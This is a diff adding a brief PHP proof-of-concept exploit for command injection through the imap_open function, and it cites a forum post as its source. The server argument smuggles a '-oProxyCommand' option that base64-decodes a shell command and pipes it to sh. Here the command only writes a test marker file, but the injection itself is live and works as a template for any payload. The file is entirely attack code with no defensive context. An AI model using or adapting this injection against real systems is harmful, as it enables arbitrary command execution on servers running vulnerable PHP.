@@ -1,0 +1,7 @@
+<?php
+# https://antichat.com/threads/463395/#post-4254681
+# echo '1234567890'>/tmp/test0001
+
+$server = "x -oProxyCommand=echo\tZWNobyAnMTIzNDU2Nzg5MCc+L3RtcC90ZXN0MDAwMQo=|base64\t-d|sh}";
+
+imap_open('{'.$server.':143/imap}INBOX', '', '') or die("\n\nError: ".imap_last_error());
